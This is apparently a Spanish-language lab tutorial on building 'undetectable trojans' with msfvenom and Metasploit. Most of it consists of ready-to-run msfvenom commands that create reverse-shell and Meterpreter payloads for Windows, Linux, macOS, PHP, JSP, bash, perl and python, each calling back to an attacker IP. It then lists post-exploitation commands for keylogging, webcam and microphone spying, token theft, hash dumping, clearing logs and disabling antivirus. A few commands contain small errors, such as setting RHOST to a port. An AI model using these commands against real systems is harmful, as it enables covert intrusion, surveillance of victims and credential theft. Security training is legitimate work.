# <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/llaves.png" width="4%">	Meterpreter & Troyano Indetectable (reverse_tcp y reverse_https)

> [!IMPORTANT]
> Laboratorio Meterpreter en <b>framework Metasploit</b> (Kali Linux 2023.4). Meterpreter (Meterpreter es el diminutivo para meta-interprete) es un payload que permite ejecutar tareas de forma remota en una máquina que se ejecuta en un nivel muy bajo de la máquina, por lo que es bastante difícil de detectar y, por tanto, muy útil para evadir sistemas antivirus, IDS o IPS. Gracias al payload Meterpreter, es posible realizar multitud de acciones sobre el sistema vulnerado, si bien no tiene porqué comportarse de la misma forma en todos los sistemas operativos. Este Payload que se ejecuta después del proceso de explotación o abuso de una vulnerabilidad en un sistema operativo, siempre en memoria, lo que evitará ser detectado.

> ### Trabajando con Meterpreter: MSFVenom y la generación de un Payload :computer:
> Con MSFVenom se simplifica la generación de payloads y los intentos de codificación de éstos, entre cuyas opciones podemos destacar: 
> - Payload, parámetro que especifica el payload que se utilizará.
> - Encoder, otro parámetro que especifica el algoritmo que se utilizará para realizar la codificación.
> - Format, donde se especifica el formato de salida del fichero (normalmente EXE, PY...)
> - Bad-chars, que indica un listado de bytes que no se deben generar en el proceso de obtención del payload (como por ejemplo, si se quieren evitar los bytes nulos '\x00' se añaden en la lista de este parámetro).
> - Iterations, que indica el número de iteraciones que se ejecutará el algoritmo del encoder (codificador)
> - Template, que permite elegir la plantilla de ejecutable que se utilizará.
> - Keep, que especifica que el payload se ejecutará en un thread (hilo) y no en el main del ejecutable, lo que produce un payload más sigiloso.


- <b>Paso 1</b>: Ya dentro de Metasploit Framework, se utilizará el exploit multi handler, payload que se utiliza para conectar con el objetivo. Dependiendo del tipo de payload, el handler queda a la espera (está en modo escucha) de una conexión por parte del payload cargado en el objetivo (reverse payload), llegando a iniciar una conexión contra el host y puertos objetivo en ciertos casos (bind payload). En la consola, se codifica:
<b>

```
use exploit/multi/handler
```
</b>

- <b>Paso 2</b>: Ahora, se procede a crear el payload como tal. La cuestión principal es para qué sistema operativo deberá estar preparado, tanto el tipo como la versión, arquitectura... ¡¡Todo con su máximo detalle!! Para ello, ejecutaremos <b>MSFVenom</b>, framework para Linux que combina la biblioteca de payloads y la de codificadores (encoders), de forma que permite generar un payload ofuscado (oculto a los sistemas antivirus y de protección) directamente. Para ello podemos consultar qué comandos tenemos disponibles:
<b>

```
msfvenom -h
```
</b>

Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
<b>

```
# Listado de payloads
msfvenom -l payloads
```

```
# Listado de opciones para payloads
msfvenom -p [payload_elegido] --list-options
```
</b>

- <b>Paso 3</b>: Se crea el payload con los parámetros necesarios para que sea efectivo y no detectado en el host objetivo:
<b>

```
msfvenom -p [payload_elegido] LHOST=[ip_atacante] LPORT=[puerto_escucha_atacante] -o [fichero_resultante]
```
</b>

Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
Así, podemos crear diversos tipos de payloads:
<b>

```
# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f exe > payload.exe
```
```
# En Java
msfvenom -p java/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f jar > payload.jar
```
```
# En python
msfvenom -p python/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.py
```
```
# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
```
```
# Para Linux
msfvenom -p linux/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
```
```
# Buffer Overflow en Linux - Shellcode
msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux 
--bad-chars "\x00\x09\x0a\x20" --out shellcode
```
</b>

<b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>
<b>

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 
-f exe -o reverse_shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && 
echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.1.222 lport=1234 -f elf -o origen_shell
```
</b>

- <b>Paso 4</b>: Volviendo a Metasploit Framework, configuramos el payload con el que se va a realizar la escucha, es decir, con el que realmente se ha infectado al host objetivo.
<b>

```
# Para un sistema de 64 bits
set payload windows/x64/meterpreter/reverse_tcp
```
```
# Para un sistema de 32 bits
set payload windows/meterpreter/reverse_tcp
```
</b>

- <b>Paso 5</b>: Posteriomente, se configuran la ip y puerto del atacante (escucha)
<b>

```
set LHOST=[ip_atacante]
```
```
set RHOST=[puerto_atacante]
```
</b>
- <b>Paso 6</b>: Ya configurado el payload (cargado en el sistema objetivo, claro está) y el Meterpreter, se procede a realizar el comienzo de ejecución del ataque como tal desde la consola de Metasploit Framework:
<b>

```
exploit
```
</b>

> A partir del momento de ejecución de payload en el host objetivo, ya estará disponible el acceso al sistema remoto, momento en el cual podremos utilizar cualquiera de los siguientes comandos de Meterpreter:

- <b>sysinfo</b>: Muestra la información del sistema en el destino remoto.
- <b>ls</b>: Lista de archivos y carpetas en el objetivo.
- <b>use priv</b>: Carga el privilegio de la extensión para extender la librería de Meterpreter.
- <b>ps</b>: Muestra todos los procesos en ejecución y que cuentas están asociadas con cada proceso.
- <b>migrate PID</b>: Migra específicamente el proceso de ID (PID es el objetivo del proceso ID obtenido desde el comandos PS)
- <b>use incognito</b>: Cargar funciones de incógnito, acciones que se utilizan para robar fichas ysuplantación de una máquina de destino.
- <b>list_tokens -u:</b> Lista los token disponibles en el objetivo por el usuario.
- <b>list_tokens -g</b>: Lista los token disponibles en el objetivo por el grupo.
- <b>impersonate_token DOMAIN_NAME\\USERNAME</b>: Se hace pasar por un token disponible en el objetivo.
- <b>steal_token PID</b>: Roba los token disponibles para un determinado proceso y hacerse pasar por esa señal.
- <b>drop_token</b>: Deja de hacerse pasar porel token actual.
- <b>getsystem</b>: Intento de elevación de permisos de acceso a nivel de sistema a través de múltiples vectores de ataque.
- <b>shell</b>: Se abre un shell interactivo con todas las órdenes disponibles.
- <b>execute -f cmd.exe -i</b>: Ejecuta rcmd.exe e interactua con él.
- <b>execute -f cmd.exe -i -t</b>: Ejecuta cmd.exe con todas las órdenes disponibles.
- <b>execute -f cmd.exe -i -H -t</b>: Ejecutar cmd.exe con todas las órdenes disponibles, convirtiéndolo en un proceso oculto.
- <b>rev2self</b>: Vuelve al usuario original que se utilizó para poner en peligro el objetivo.
- <b>reg command</b>: Interactua, crea, elimina, consulta, setea... y mucho más en el registro del destino.
- <b>setdesktop number</b>: Cambia a una pantalla diferente en función de quién está conectado.
- <b>screenshot</b>: Se graba una captura de pantalla de la pantalla del host objetivo en el host atacante.
- <b>Record_mic</b>: Con este parámetro podremos activar el micrófono y grabar guardando en el host atacante en un archivo de audio indicado. Se ha de tener en cuenta que (por defecto) siempre grabará en segundos, a no ser que se indique con el parámetro d el número de segundos a grabar.
- <b>Webcam_chat</b>: Se establece comunicación con la víctima, es decir, realizar un video chat.
- <b>Webcam_list</b>: Proporciona una lista de las webcams que tenga el equipo.
- <b>Webcam_snap</b>: Se puede activar la webcam y realizar una foto de lo que se esté viendo en ese instante.
- <b>Webcam_stream</b>: Con esta instrucción se activa la webcam y se visualiza en tiempo real.
- <b>upload file</b>: Subir un archivo al objetivo.
- <b>download file</b>: Descargar los archivos desde el objetivo.
- <b>keyscan_start</b>: Detección de las pulsaciones de teclado en el destino remoto.
- <b>keyscan_dump</b>: Volcado de las pulsaciones de teclas del host capturado.
- <b>keyscan_stop</b>: Dejar de detectar las pulsaciones de teclado en el destino remoto.
- <b>getprivs</b>: Obtener tantos privilegios como sea posible en el objetivo, siempre teniendo en cuenta que es posible que tengamos el máximo de privilegios.
- <b>uictl enable keyboard/mouse</b>: Toma el control del teclado y/o ratón.
- <b>background</b>: Ejecuta el shell actual de Meterpreter en segundo plano.
- <b>hashdump</b>: Volcado de todos los hashes en el objetivo.
- <b>use sniffer</b>: Carga del módulo sniffer.
- <b>sniffer_interfaces</b>: Lista los interfaces disponibles del objetivo.
- <b>sniffer_dump interfaceID pcapname</b>: Ejecuta el sniffer en el destino remoto.
- <b>sniffer_start interfaceID packet-buffer</b>: Comienza a ejecutar el sniffer con una gama específica para un buffer de paquetes.
- <b>sniffer_stats interfaceID</b>: Coge la información de estadística de la interfaz que está en sniffer.
- <b>sniffer_stop interfaceID</b>: Detención del sniffer.
- <b>add_user username password -h ip</b>: Agrega un usuario en el destino remoto.
- <b>add_group_user “Domain Admins” username -h ip</b>: Añade un nombre de usuario al grupo Administradores de dominio en el destino remoto.
- <b>clearev</b>: Borra el registro de eventos en el equipo de destino.
- <b>timestomp</b>: Cambia los atributos de archivo, como fecha de creación (método antiforensics)
- <b>reboot</b>: Reinicia el equipo de destino.
- <b>Getcountermeasure</b>: Permite deshabilitar medidas de seguridad como antivirus, firewalls y otros.
- <b>Gettelnet</b>: Se utiliza para habilitar telnet en la máquina de la víctima.
- <b>Checkvm</b>: Comprobación si está ejecutando una máquina virtual o no.
- <b>KillAV</b>: Permite desactivar la mayoría de los programas antivirus.
- <b>ScreenSpy</b>: Realiza capturas de pantalla de forma remota.
- <b>scrapper</b>: Permite importar una gran cantidad de información sobre el objetivo (el registro, hash, usuarios,…) a nuestra computadora.